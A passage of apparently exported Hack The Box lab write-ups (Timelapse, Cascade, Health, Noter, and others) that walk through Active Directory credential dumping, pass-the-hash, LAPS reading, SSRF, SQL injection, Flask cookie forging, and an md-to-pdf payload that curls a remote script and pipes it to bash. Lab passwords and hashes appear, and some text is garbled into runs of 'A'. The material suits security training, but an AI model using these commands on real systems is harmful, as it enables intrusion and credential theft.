----\nd-----        1/25/2020   1:05 PM                Administrator\nd-----        1/23/2020   9:52 AM                FSmith\nd-r---        1/22/2020   9:32 PM                Public\nd-----        1/24/2020   4:05 PM                svc_loanmgr\n```\n\nThis means that we can login as svc_loanmgr using winrm.\n\nWe then discover using bloodhound that svc_loanmgr can use a DCSync attack, this will allow us to dump the Administrator password from the AD.\n\n```\n❯ impacket-secretsdump EGOTISTICAL-BANK/svc_loanmgr@10.10.10.175 -just-dc-user Administrator                                                                                                                                          06:24:30\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\nPassword:\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::\n[*] Kerberos keys grabbed\nAdministrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657\nAdministrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e\nAdministrator:des-cbc-md5:fb8f321c64cea87f\n[*] Cleaning up...\n```\n\nWe can then use `impacket-psexec` to login as Administrator using the NT hash and access the root flag under `C:\\Users\\Administrator\\Desktop\\root.txt`\n\n```\n❯ impacket-psexec EGOTISTICAL-BANK/Administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e\n...\nC:\\Users\\Administrator\\Desktop\u003e whoami\nnt authority\\system\n```\n\n\nAAAAAAAAAAAAAAAA","lastmodified":"2023-08-21T11:55:44.167435053Z","tags":null},"/HTB/Easy/Timelapse/Timelapse":{"title":"HTB - Timelapse","content":"\n## Foothold\n### Nmap \n```\nPORT STATE SERVICE VERSION  \n53/tcp open domain Simple DNS Plus  \n88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-17 04:26:06Z)  \n135/tcp open msrpc Microsoft Windows RPC  \n139/tcp open netbios-ssn Microsoft Windows netbios-ssn  \n389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)  \n445/tcp open microsoft-ds?  \n464/tcp open kpasswd5?  \n593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  \n636/tcp open ldapssl?  \n3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)  \n3269/tcp open globalcatLDAPssl?  \nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows  \n  \nHost script results:  \n|_clock-skew: 7h59m58s  \n| smb2-security-mode:  \n| 3.1.1:  \n|_ Message signing enabled and required  \n| smb2-time:  \n| date: 2022-08-17T04:26:18  \n|_ start_date: N/A\n```\n\nTypical windows box. Let's look for look for interresting stuff:\n#### LDAP\n```\nnmap -n -sV --script \"ldap* and not brute\" timelapse.htb  -Pn\n\tdap-rootdse:  \n| LDAP Results  \n| \u003cROOT\u003e  \n| domainFunctionality: 7  \n| forestFunctionality: 7  \n| domainControllerFunctionality: 7  \n| rootDomainNamingContext: DC=timelapse,DC=htb  \n| ldapServiceName: timelapse.htb:dc01$@TIMELAPSE.HTB  \n| isGlobalCatalogReady: TRUE  \n| supportedSASLMechanisms: GSSAPI  \n| supportedSASLMechanisms: GSS-SPNEGO  \n| supportedSASLMechanisms: EXTERNAL  \n| supportedSASLMechanisms: DIGEST-MD5  \n| supportedLDAPVersion: 3  \n| supportedLDAPVersion: 2  \n| supportedLDAPPolicies: MaxPoolThreads  \n| supportedLDAPPolicies: MaxPercentDirSyncRequests  \n| supportedLDAPPolicies: MaxDatagramRecv  \n| supportedLDAPPolicies: MaxReceiveBuffer  \n| supportedLDAPPolicies: InitRecvTimeout  \n| supportedLDAPPolicies: MaxConnections  \n| supportedLDAPPolicies: MaxConnIdleTime  \n| supportedLDAPPolicies: MaxPageSize  \n| supportedLDAPPolicies: MaxBatchReturnMessages  \n| supportedLDAPPolicies: MaxQueryDuration  \n| supportedLDAPPolicies: MaxDirSyncDuration  \n| supportedLDAPPolicies: MaxTempTableSize  \n| supportedLDAPPolicies: MaxResultSetSize  \n| supportedLDAPPolicies: MinResultSets  \n| supportedLDAPPolicies: MaxResultSetsPerConn  \n| supportedLDAPPolicies: MaxNotificationPerConn  \n| supportedLDAPPolicies: MaxValRange  \n| supportedLDAPPolicies: MaxValRangeTransitive  \n| supportedLDAPPolicies: ThreadMemoryLimit  \n| supportedLDAPPolicies: SystemMemoryLimitPercent  \n| supportedControl: 1.2.840.113556.1.4.319  \n| supportedControl: 1.2.840.113556.1.4.801  \n| supportedControl: 1.2.840.113556.1.4.473  \n| supportedControl: 1.2.840.113556.1.4.528  \n| supportedControl: 1.2.840.113556.1.4.417  \n| supportedControl: 1.2.840.113556.1.4.619  \n| supportedControl: 1.2.840.113556.1.4.841  \n| supportedControl: 1.2.840.113556.1.4.529  \n| supportedControl: 1.2.840.113556.1.4.805  \n| supportedControl: 1.2.840.113556.1.4.521  \n| supportedControl: 1.2.840.113556.1.4.970  \n| supportedControl: 1.2.840.113556.1.4.1338  \n| supportedControl: 1.2.840.113556.1.4.474  \n| supportedControl: 1.2.840.113556.1.4.1339  \n| supportedControl: 1.2.840.113556.1.4.1340  \n| supportedControl: 1.2.840.113556.1.4.1413  \n| supportedControl: 2.16.840.1.113730.3.4.9  \n| supportedControl: 2.16.840.1.113730.3.4.10  \n| supportedControl: 1.2.840.113556.1.4.1504  \n| supportedControl: 1.2.840.113556.1.4.1852  \n| supportedControl: 1.2.840.113556.1.4.802  \n| supportedControl: 1.2.840.113556.1.4.1907  \n| supportedControl: 1.2.840.113556.1.4.1948  \n| supportedControl: 1.2.840.113556.1.4.1974  \n| supportedControl: 1.2.840.113556.1.4.1341  \n| supportedControl: 1.2.840.113556.1.4.2026  \n| supportedControl: 1.2.840.113556.1.4.2064  \n| supportedControl: 1.2.840.113556.1.4.2065  \n| supportedControl: 1.2.840.113556.1.4.2066  \n| supportedControl: 1.2.840.113556.1.4.2090  \n| supportedControl: 1.2.840.113556.1.4.2205  \n| supportedControl: 1.2.840.113556.1.4.2204  \n| supportedControl: 1.2.840.113556.1.4.2206  \n| supportedControl: 1.2.840.113556.1.4.2211  \n| supportedControl: 1.2.840.113556.1.4.2239  \n| supportedControl: 1.2.840.113556.1.4.2255  \n| supportedControl: 1.2.840.113556.1.4.2256  \n| supportedControl: 1.2.840.113556.1.4.2309  \n| supportedControl: 1.2.840.113556.1.4.2330  \n| supportedControl: 1.2.840.113556.1.4.2354  \n| supportedCapabilities: 1.2.840.113556.1.4.800  \n| supportedCapabilities: 1.2.840.113556.1.4.1670  \n| supportedCapabilities: 1.2.840.113556.1.4.1791  \n| supportedCapabilities: 1.2.840.113556.1.4.1935  \n| supportedCapabilities: 1.2.840.113556.1.4.2080  \n| supportedCapabilities: 1.2.840.113556.1.4.2237  \n| subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=timelapse,DC=htb  \n| serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=timelapse,DC=htb  \n| schemaNamingContext: CN=Schema,CN=Configuration,DC=timelapse,DC=htb  \n| namingContexts: DC=timelapse,DC=htb  \n| namingContexts: CN=Configuration,DC=timelapse,DC=htb  \n| namingContexts: CN=Schema,CN=Configuration,DC=timelapse,DC=htb  \n| namingContexts: DC=DomainDnsZones,DC=timelapse,DC=htb  \n| namingContexts: DC=ForestDnsZones,DC=timelapse,DC=htb  \n| isSynchronized: TRUE  \n| highestCommittedUSN: 131212  \n| dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=timelapse,DC=htb  \n| dnsHostName: dc01.timelapse.htb  \n| defaultNamingContext: DC=timelapse,DC=htb  \n| currentTime: 20220817061937.0Z  \n|_ configurationNamingContext: CN=Configuration,DC=timelapse,DC=htb\n```\n=\u003e Machine's FQDN is dc01.timelapse.htb\n\n### SMB\nEnumerating shares gives us a share accessible by guest.\nWe retrieve a password protected zip file : `winrm_backup.zip`\n\n## User \nUser is a succession of password bruteforcing using JTR:\n\t- `zip2john` for the archive password\n\t\t- `zip2john winrm_backup.zip \u003e zip_hash`\n\t- `pfx2john` for the `legacyy_dev_auth.pfx` file that was inside the archive\n\t- We can force the .pfx file using `pfx2jhon`\nFinally, when can retrieve a `.pem` file with openssl from the .pfx using: \n\t`openssl pkcs12 -in legacyy_dev_auth.pfx -out key.pem`\n\nSplitting the key.pem into to files `legacyy.cert` and `legacyy.key` we can successfully connect to the machine using evil-winrm:\n`evil-winrm -S -c legacyy.cert -k legacyy.key -i 10.10.11.152`\n\nUpon connecting we can retrieve the user flag.\n\n### LPE\nNo lateral movement is need in this box.\nUsing winPEAS we discover that a CLI history file was left by the user legacy\n```\n\u003e type C:\\Users\\legacyy\\...\\PSReadLine\\ConsoleHost_history.txt \nwhoami  \nipconfig /all  \nnetstat -ano |select-string LIST  \n$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck  \n$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force  \n$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)  \ninvoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}  \nget-aduser -filter * -properties *  \nexit\n```\n\nUsing those commands we can execute commands as svc_deploy.\nWe can use `net user svc_deploy`  in order to get more informations about `svc_deploy` user.\n```\nUser name svc_deploy  \nFull Name svc_deploy  \nComment  \nUser's comment  \nCountry/region code 000 (System Default)  \nAccount active Yes  \nAccount expires Never  \n  \nPassword last set 10/25/2021 12:12:37 PM  \nPassword expires Never  \nPassword changeable 10/26/2021 12:12:37 PM  \nPassword required Yes  \nUser may change password Yes  \n  \nWorkstations allowed All  \nLogon script  \nUser profile  \nHome directory  \nLast logon 8/17/2022 12:31:12 AM  \n  \nLogon hours allowed All  \n  \nLocal Group Memberships *Remote Management Use  \nGlobal Group memberships *LAPS_Readers *Domain Users\n```\nLAPS_Reader =\u003e NICE!\n\nUsing the fact that `svc_deploy` can read from the LAPS (Local Administrator Password Solution) we can retrieve `ms-mcs-AdmPwd`\n\n\u003eThe \"ms-mcs-AdmPwd\" a \"confidential\" computer attribute that stores the clear-text LAPS password. Confidential attributes can only be viewed by Domain Admins by default, and unlike other attributes, is not accessible by Authenticated Users\n\u003e*From https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#extract-laps-password*\n\nThen:\n```\n\u003e invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}\n\nPSComputerName : localhost  \nRunspaceId : 6cbb179a-77d1-4100-89c2-f608731997fb  \nDistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb  \nDNSHostName : dc01.timelapse.htb  \nEnabled : True  \nms-Mcs-AdmPwd : oE,0DU#pshs25U3aC!IqM!,.  \nms-Mcs-AdmPwdExpirationTime : 133056103313755333  \nName : DC01  \nObjectClass : computer  \nObjectGUID : 6e10b102-6936-41aa-bb98-bed624c9b98f  \nSamAccountName : DC01$  \nSID : S-1-5-21-671920749-559770252-3318990721-1000  \nUserPrincipalName :  \n  \nPSComputerName : localhost  \nRunspaceId : 6cbb179a-77d1-4100-89c2-f608731997fb  \nDistinguishedName : CN=DB01,OU=Database,OU=Servers,DC=timelapse,DC=htb  \nDNSHostName :  \nEnabled : True  \nName : DB01  \nObjectClass : computer  \nObjectGUID : d38b3265-230f-47ae-bdcd-f7153da7659d  \nSamAccountName : DB01$  \nSID : S-1-5-21-671920749-559770252-3318990721-1606  \nUserPrincipalName :  \n  \nPSComputerName : localhost  \nRunspaceId : 6cbb179a-77d1-4100-89c2-f608731997fb  \nDistinguishedName : CN=WEB01,OU=Web,OU=Servers,DC=timelapse,DC=htb  \nDNSHostName :  \nEnabled : True  \nName : WEB01  \nObjectClass : computer  \nObjectGUID : 897c7cfe-ba15-4181-8f2c-a74f88952683  \nSamAccountName : WEB01$  \nSID : S-1-5-21-671920749-559770252-3318990721-1607  \nUserPrincipalName :  \n  \nPSComputerName : localhost  \nRunspaceId : 6cbb179a-77d1-4100-89c2-f608731997fb  \nDistinguishedName : CN=DEV01,OU=Dev,OU=Servers,DC=timelapse,DC=htb  \nDNSHostName :  \nEnabled : True  \nName : DEV01  \nObjectClass : computer  \nObjectGUID : 02dc961a-7a60-4ec0-a151-0472768814ca  \nSamAccountName : DEV01$  \nSID : S-1-5-21-671920749-559770252-3318990721-1608  \nUserPrincipalName :\n```\nWe got the password yay!\n\nWe can then connect as Administrator on the machine using `evil-winrm` without forgetting to use the `-S` option since this is LDAPS and not LDAP.\n\nAAAAAAAAAAAAAAAA","lastmodified":"2023-08-21T11:55:44.167435053Z","tags":null},"/HTB/Hard/Hard":{"title":"HTB - Hard","content":"\n## Hard HTB boxes","lastmodified":"2023-08-21T11:55:44.167435053Z","tags":null},"/HTB/Medium/Cascade/Cascade":{"title":"HTB - Cascade","content":"\n```\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\n| dns-nsid: \n|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-16 17:02:51Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n49154/tcp open  msrpc         Microsoft Windows RPC\n49155/tcp open  msrpc         Microsoft Windows RPC\n49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\nService Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   210: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2023-03-16T17:03:44\n|_  start_date: 2023-03-16T15:59:37\n```\nClassic windows box with ldap and smb2 server.\n\nUsing `ldeep` we enumerate users on the domain \n```\n~/HTB/Cascade\n❯ ldeep ldap -a -d cascade.local -s ldap://10.10.10.182 users all                                             \n['i.croft']\n['j.allen']\n['BackupSvc']\n['d.burman']\n['b.hanson']\n['e.crowe']\n['a.turnbull']\n['j.goodhand']\n['s.hickson']\n['j.wakefield']\n['util']\n['r.thompson']\n['s.smith']\n['arksvc']\n['CascGuest']\n```\n\nSince Kerberos is enabled on the domain, we can try to check if the users we got in LDAP matches any users in the AD. To do that, we'll use `kerbrute`\n```\n~/HTB/Cascade\n❯ /home/kali/kerbrute_linux_amd64 userenum --dc 10.10.10.182 --domain cascade.local ldap_users \n\n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,\u003c /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: v1.0.3 (9dad6e1) - 03/16/23 - Ronnie Flathers @ropnop\n\n2023/03/16 13:19:56 \u003e  Using KDC(s):\n2023/03/16 13:19:56 \u003e  \t10.10.10.182:88\n\n2023/03/16 13:20:01 \u003e  [+] VALID USERNAME:\t d.burman@cascade.local\n2023/03/16 13:20:01 \u003e  [+] VALID USERNAME:\t j.wakefield@cascade.local\n2023/03/16 13:20:01 \u003e  [+] VALID USERNAME:\t BackupSvc@cascade.local\n2023/03/16 13:20:01 \u003e  [+] VALID USERNAME:\t a.turnbull@cascade.local\n2023/03/16 13:20:01 \u003e  [+] VALID USERNAME:\t j.goodhand@cascade.local\n2023/03/16 13:20:01 \u003e  [+] VALID USERNAME:\t s.hickson@cascade.local\n2023/03/16 13:20:01 \u003e  [+] VALID USERNAME:\t j.allen@cascade.local\n2023/03/16 13:20:06 \u003e  [+] VALID USERNAME:\t util@cascade.local\n2023/03/16 13:20:06 \u003e  [+] VALID USERNAME:\t arksvc@cascade.local\n2023/03/16 13:20:06 \u003e  [+] VALID USERNAME:\t s.smith@cascade.local\n2023/03/16 13:20:06 \u003e  [+] VALID USERNAME:\t r.thompson@cascade.local\n```\n \nLooking for more infos in the user inside LDAP\n```\n~/HTB/Cascade\n❯ ldapsearch -x -H ldap://10.10.10.182 -b 'DC=cascade,DC=local' -s sub '(objectclass=user)'\n...\n# Ryan Thompson, Users, UK, cascade.local\ndn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local\n...\nsAMAccountName: r.thompson\nsAMAccountType: 805306368\nuserPrincipalName: r.thompson@cascade.local\nobjectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local\n...\ncascadeLegacyPwd: clk0bjVldmE=\n...\n```\n\nAn additional attribute was added to the Ryan Thompson user data inside the LDAP server, upon decoding the `cascadeLegacyPwd` we find the password of r.thompson. We can confirm that by trying to use it wit crackmapexec\n```\n~/HTB/Cascade\n❯ cme smb cascade.local -u r.thompson -p 'rY4n5eva' --shares\nSMB         cascade.local   445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)\nSMB         cascade.local   445    CASC-DC1         [+] cascade.local\\r.thompson:rY4n5eva \nSMB         cascade.local   445    CASC-DC1         [+] Enumerated shares\nSMB         cascade.local   445    CASC-DC1         Share           Permissions     Remark\nSMB         cascade.local   445    CASC-DC1         -----           -----------     ------\nSMB         cascade.local   445    CASC-DC1         ADMIN$                          Remote Admin\nSMB         cascade.local   445    CASC-DC1         Audit$                          \nSMB         cascade.local   445    CASC-DC1         C$                              Default share\nSMB         cascade.local   445    CASC-DC1         Data            READ            \nSMB         cascade.local   445    CASC-DC1         IPC$                            Remote IPC\nSMB         cascade.local   445    CASC-DC1         NETLOGON        READ            Logon server share \nSMB         cascade.local   445    CASC-DC1         print$          READ            Printer Drivers\nSMB         cascade.local   445    CASC-DC1         SYSVOL          READ            Logon server share\n```\n\nWe'll leave aside the `Audit$` share and focus on the `Data` one first.\n```\n.\n├── Email Archives\n│   └── Meeting_Notes_June_2018.html\n├── LogonAudit\n├── Logs\n│   ├── Ark AD Recycle Bin\n│   │   └── ArkAdRecycleBin.log\n│   └── DCs\n│       └── dcdiag.log\n└── Temp\n    ├── r.thompson\n    └── s.smith\n        └── VNC Install.reg\n```\n\nThere is multiple information's that we can deduce from this data :)\n1. We have an encrypted version of the `s.smith` password\n2. Inside the `Meeting_Notes_June_2018.html` file we discover that there is a temp admin that have the same credential as the real admin\n3. The `ArkAdRecycleBin.log` tells us that  the TempAdmin was deleted and put in the AD Recycle Bin\n\n## Getting `s.smith` password\nInside the `Temp/s.smith` directory we discover a registry file that looks like a `TightVNC` server configuration. Inside we find a key named password in an hexadecimal format\n```\n\"UseMirrorDriver\"=dword:00000001\n\"EnableUrlParams\"=dword:00000001\n\"Password\"=hex:6b,cf,2a,4b,6e,5a,ca,0f\n\"AlwaysShared\"=dword:00000000\n\"NeverShared\"=dword:00000000\n```\n\nUsing this following [resource](https://github.com/billchaison/VNCDecrypt) we can successfully decode the password\n```\n❯ echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv                                                                                              14:53:39\n00000000  73 54 33 33 33 76 65 32                           |sT333ve2|\n00000008\n```\n\nThis give us `s.smith` with which we can logon to the machine using evil-winrm and access the user flag.\n\n`s.smith` have access to the `Audit$` share which contains some windows binaries as well as an `Audit.db`.\n\nUsing `smbclient`, we can retrieve all the files located inside the share\n```\n❯ smbclient \\\\\\\\10.10.10.182\\\\Audit\\$ -Tc audit_allfiles.tar / -U CASCADE.LOCAL/s.smith\n...\n❯ tree\n.\n├── audit_allfiles.tar\n├── CascAudit.exe\n├── CascCrypto.dll\n├── DB\n│   └── Audit.db\n├── RunAudit.bat\n├── x64\n│   └── SQLite.Interop.dll\n└── x86\n    └── SQLite.Interop.dll\n```\n\nInside the Audit db we find a base64 encoded password that belongs to `ArkSvc`.\n\n`ArkSvc` belongs to the `AD Recycle Bin` group, this mean that if we are able to become this user we'll  be able to retrieve the password of `TempAdmin` which would be the `Administrator` password\n```\n*Evil-WinRM* PS C:\\Users\\s.smith\\Documents\u003e net user arksvc\nUser name                    arksvc\nFull Name                    ArkSvc\nComment\nUser's comment\n...\nLocal Group Memberships      *AD Recycle Bin       *IT       *Remote Management Use\nGlobal Group memberships     *Domain Users\n```\n\n## Decompiling `CascAudit.exe` \n\nUsing ILSpy and Avalonia we can decompile the executable and find that the base64 password that we found is actually AES encrypted and that the IV and the Key  to encrypt the password are in plain text.\n\nWe can use them to decrypt `ArkSvc`s password and login as `ArkSvc` with evil-winrm\n\n![](HTB/Medium/Cascade/Pasted%20image%2020230316233054.png)\n\nJudging from the [Hacktricks section](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#ad-recycle-bin) about the `AD Recycle Bin` group we can list all AD object that were deleted, thus allowing us to retrieve the `TempAdmin` object\n```\n*Evil-WinRM* PS C:\\Users\\arksvc\\Documents\u003e Get-ADObject -filter 'isDeleted -eq $true -and sAMAccountName -eq \"TempAdmin\"' -includeDeletedObjects -Properties *\n...\ncascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz\nCN                              : TempAdmin\n...\nsAMAccountName                  : TempAdmin\nsDRightsEffective               : 0\nuserAccountControl              : 66048\nuserPrincipalName               : TempAdmin@cascade.local\nuSNChanged                      : 237705\nuSNCreated                      : 237695\nwhenChanged                     : 1/27/2020 3:24:34 AM\nwhenCreated                     : 1/27/2020 3:23:08 AM\n```\n\nUsing the password inside `cascadeLegacyPwd` attribute, we can login as the Administrator and get the root password\n\n## Videos references\n### IppSec\n{{\u003c youtube mr-fsVLoQGw \u003e}}","lastmodified":"2023-08-21T11:55:44.167435053Z","tags":null},"/HTB/Medium/Health/Health":{"title":"HTB - Health","content":"\n## Foothold\n### Nmap\n```\nPORT STATE SERVICE VERSION  \n22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)  \n| ssh-hostkey:  \n| 2048 32:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31 (RSA)  \n| 256 86:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c (ECDSA)  \n|_ 256 ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f (ED25519)  \n80/tcp open http Apache httpd 2.4.29 ((Ubuntu))  \n|_http-title: HTTP Monitoring Tool  \n3000/tcp filtered ppp\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\nClassic box with filtered port on *3000*\n\nSSRF on webhook app:\n\nWe can use this script to exploit the vuln:\n\n```python\nimport sys\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\n\nif len(sys.argv)-1 != 2:\n    print(\"Usage: {} \u003cport_number\u003e \u003curl\u003e\".format(sys.argv[0]))\n    sys.exit()\n\nclass Redirect(BaseHTTPRequestHandler):\n   def do_GET(self):\n       self.send_response(302)\n       self.send_header('Location', sys.argv[2])\n       self.end_headers()\n\nHTTPServer((\"\", int(sys.argv[1])), Redirect).serve_forever()\n```\n\nWe discover a *Gogs* service running on the port *3000*. We can exploit it using a known CVE. Redirecting the request on this url, we can execute SQL code:\n````txt\nhttp://127.0.0.1:3000/api/v1/users/search?q=%27)/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--\n````\n\n\n## User\n\nWe got an user `susanne` with a salt `sO3XIbeW14` and a password `66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37`\n\nBy looking at the *gogs* source code we see that the salt needs to be converted in base64 before cracking the password.\n\n```\n\u003e echo \"sO3XIbeW14\" | base64 | cut -c1-14                                                                    \nc08zWEliZVcxNA\n```\n\nIn order to crack the password we need to convert it first in in a binary format then convert it in base64\n\n```\n\u003e echo \"66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37\" | xxd -r -p | base64\nZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=\n```\n\nUsing hascat on the hash we can crack the password: `february15`\n\nWe can now login on ssh using the password \n\ngot user.txt\n\n## LPE\n\nWe access the mysql creds in the .env inside the code folder\n\nCron job : `TRUNCATE` of table `tasks` ran as root.\n\nWe can modify the table and add `file:///root/root.txt` and create a webhook ","lastmodified":"2023-08-21T11:55:44.167435053Z","tags":null},"/HTB/Medium/Medium":{"title":"HTB - Medium","content":"\n## Medium HTB boxes\n- [Health](HTB/Medium/Health/Health.md)\n- [Noter](HTB/Medium/Noter/Noter.md)\n- [Scrambled](HTB/Medium/Scrambled/Scrambled.md)\n- [Shared](HTB/Medium/Shared/Shared.md)\n- [Outdated](HTB/Medium/Outdated/Outdated.md)\n- [Cascade](HTB/Medium/Cascade/Cascade.md)","lastmodified":"2023-08-21T11:55:44.167435053Z","tags":null},"/HTB/Medium/Noter/Noter":{"title":"HTB - Noter","content":"\n## Foothold\n### Nmap\n```  \nPORT STATE SERVICE VERSION  \n21/tcp open ftp vsftpd 3.0.3  \n22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  \n5000/tcp open http Werkzeug httpd 2.0.2 (Python 3.8.10)  \n```\nClassic linux box with unauthorized anonymous login on ftp and a Flask webapp on port 5000.\n\nWebsite is a note taking service. We can create an account and login using */login* and */register*.\n\nCookie is a JWT. And since this is Flask we can use [this tool]([https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask)) in order to bruteforce the signing key. This will allow us to craft our own cookies.\n\u003e Don't forget to have your machine time synced with the machine\n\u003e Thx hAAAAAAAAAAAAAAAAtricks\n\n```\n\u003e ../.local/bin/flask-unsign -u -c \u003c cookie.txt\n\n[*] Session decodes to: {'logged_in': True, 'username': 'azer'}\n[*] No wordlist selected, falling back to default wordlist..\n[*] Starting brute-forcer with 8 threads..\n[+] Found secret key after 18304 attemptscXqPyDHaOR4K\n'secret123'\n```\n\nWhen we try to login, we can see that there is two different message that pops up depending whether or not we're trying to login with an existing user. \n\nSince ffuf doesn't work, let's use a custom made python script    \n```  \n...  \nTrying: blowfish  \nTrying: bls  \nTrying: blue  \nFound valid username: blue  \n```\n\nLet's craft a cookie that will hold the *username* property as *blue* :\n```\n\u003e ../.local/bin/flask-unsign -s -c \"{'logged_in': True, 'username': 'blue'}\" --\nsecret secret123\n\neyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yw-1Yg.roc8aqCf9Cn3ePy2b91EjAyHaTw\n```\n\nWe can successfully impersonate user *blue* inside the note web application.\n\n## User\nBrowsing the notes available to read as *blue* we find this one :\n```\nHello, Thank you for choosing our premium service. Now you are capable of  \ndoing many more things with our application. All the information you are going  \nto need are on the Email we sent you. By the way, now you can access our FTP  \nservice as well. Your username is 'blue' and the password is 'blue@Noter!'.  \nMake sure to remember them and delete this.  \n(Additional information are included in the attachments we sent along the  \nEmail)  \n  \nWe all hope you enjoy our service. Thanks!  \n  \nftp_admin\n```\n\nTrying to login as user *blue*  with password *blue@Noter!* we can access a pdf file on the ftp server that tells us that every passwords is formatted the same way:\n*{username}@Noter!* . We can use this to guess the password of *ftp_admin* !\n\nWe retrieve two backup files containing the code of the web app.\n\n*md-to-pdf* is vulnerable in the */export_from_cloud* route. We can serve a malicious .md file containing `---js\\n((require(\"child_process\")).execSync(\"curl http://10.10.14.174/rev_shel.sh | bash\"))\\n---RCE` \n\nWe get an access AND the user flag !\n\n## LPE\n\nUsing *linpeas* we can see that the mysql server is ran by root.\n\nWe can use [this tutorial](https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf) in order to get the root flag !\n\nAAAAAAAAAAAAAAAA","lastmodified":"2023-08-21T11:55:44.167435053Z","tags":null},"/HTB/Medium/Outdated/Outdated":{"title":"HTB - Outdated","content":"\n## Foothold\n### Nmap\n```\n25/tcp open smtp hMailServer smtpd  \n| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP  \n|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY  \n53/tcp open domain Simple DNS Plus  \n88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-17 19:19:09Z)  \n135/tcp open msrpc Microsoft Windows RPC  \n139/tcp open netbios-ssn Microsoft Windows netbios-ssn  \n389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)  \n|_ssl-date: 2022-08-17T19:20:39+00:00; +6h59m54s from scanner time.  \n| ssl-cert: Subject:  \n| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED  \n| Not valid before: 2022-06-18T05:50:24  \n|_Not valid after: 2024-06-18T06:00:24  \n445/tcp open microsoft-ds?  \n464/tcp open kpasswd5?  \n593/tcp open ncacn_http Microsoft 